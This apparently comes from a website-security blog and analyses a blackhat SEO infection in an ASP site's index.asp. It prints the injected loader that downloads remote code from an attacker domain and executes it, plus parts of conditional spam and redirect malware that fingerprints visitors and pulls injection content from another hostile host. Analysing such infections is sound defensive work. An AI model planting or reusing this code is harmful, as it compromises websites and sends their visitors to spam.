Blackhat SEO and ASP Sites

It’s all too easy to scream and holler at PHP based websites and the various malware variants associate with the technology, but perhaps we’re a bit too biased.
Here is a quick post on ASP variant. Thought we’d give you Microsoft types some love too.
Today we found this nice BlackHat SEO attack:

Finding it was easy. The bad code was sitting at the beginning of index.asp begging for some attention:

Server.ScriptTimeout=1500
body=GetHtml("httx://seo-chat.biz/google/fileroot.txt")
execute body
Public Function GetHtml(url)
Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
ObjXMLHTTP.Open "GET",url,False
ObjXMLHTTP.setRequestHeader "User-Agent",url
ObjXMLHTTP.send
GetHtml=ObjXMLHTTP.responseBody
Set ObjXMLHTTP=Nothing
set objStream = Server.CreateObject("Adodb.Stream")
objStream.Type = 1
objStream.Mode =3
objStream.Open
objStream.Write GetHtml
objStream.Position = 0
objStream.Type = 2
objStream.Charset = "UTF-8"
GetHtml = objStream.ReadText
objStream.Close
End Function

The code is really straight forward, it creates a function called GetHtml, that downloads the content from httx://seo-chat.biz/google/fileroot.txt and executes it.
Curious what the code is? Not to worry, it’s nothing more than an ASP variant of some good old conditional malware (image is a snippet).

What I do find very interesting about this code is the following snippet:

Refer= Request.ServerVariables("HTTP_REFERER") '// 父级来源地址
user_agent=Request.ServerVariables("HTTP_USER_AGENT") '//服务器信息
host=Request.ServerVariables("HTTP_HOST")
ip=Request.ServerVariables("REMOTE_ADDR")

http_host = host
info = Request.ServerVariables("PATH_INFO")

If InStr(http_host,"www") > 0 Then
shellsite=right(http_host,len(http_host)-3-InStr(http_host,"www"))
else
shellsite=http_host
end if

base = "http://www.cheapspycamerasinc.info/google"
indexurl = base&"/"&shellsite&"/index.php"

object_str = base&"/"&shellsite&"/object.txt"
if CheckURL(object_str) then
ret_object = Trim(getHTTPPage(object_str))
end if

Each infected site has its own version of the spam content, only “valid” infected sites will download this spam code. You’ll find that the iframe injection is also there:

jump_str = base&"/"&shellsite&"/jump.txt"
'response.Write jump_str

newcode = 0 '是否是新跳转代码

if Len(ret_object)>3 and CheckURL(object_str) then
open_urls = base&"/"&ret_object&"/url.txt" '跳转站列表
'response.Write open_urls
open_urls = getHTTPPage(open_urls)
'随机取个站2013-08-23
DomainTypeArray = split(open_urls,"|")
Pathcoun = Ubound(DomainTypeArray)
Randomize
RndNumber = INT((Pathcoun+1)*RND)
'response.Write DomainTypeArray(RndNumber)
if instr(DomainTypeArray(RndNumber),"www")>0 then
open_url = ""
else
open_url = ""
end if
newcode = 1
else
open_url = base&"/"&shellsite&"/url.txt" '唯一跳转代码
end if

It’s a good dynamic control of what to inject in the sites code.
In short, all this to say, ASP is no better than PHP, there are equal number of variants on both technologies. We just write more about PHP as it’s one of the most prevalent technologies being consumed by everyday website owners, and their lovely Content Management Systems (CMS).
Oh, and did anyone else notice, what appears to be, Chinese :)… ummmm….. ;P
